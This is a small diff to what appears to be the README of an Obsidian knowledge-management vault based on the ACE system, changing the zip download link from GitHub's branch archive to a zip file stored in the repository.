@@ -4,7 +4,7 @@ An integrated **knowledge management system** based on the \[\[ACE System|ACE fo
 
 ---
 
-💾 [Download .zip](https://github.com/NonakaVal/obsidian-ACE-ARC/archive/refs/heads/main.zip)
+💾 [Download .zip](https://github.com/NonakaVal/obsidian-ACE-ARC/raw/refs/heads/main/obsidian-ACE-ARC.zip)
 
 # \[\[ACE System|ACE Organization System]]
 
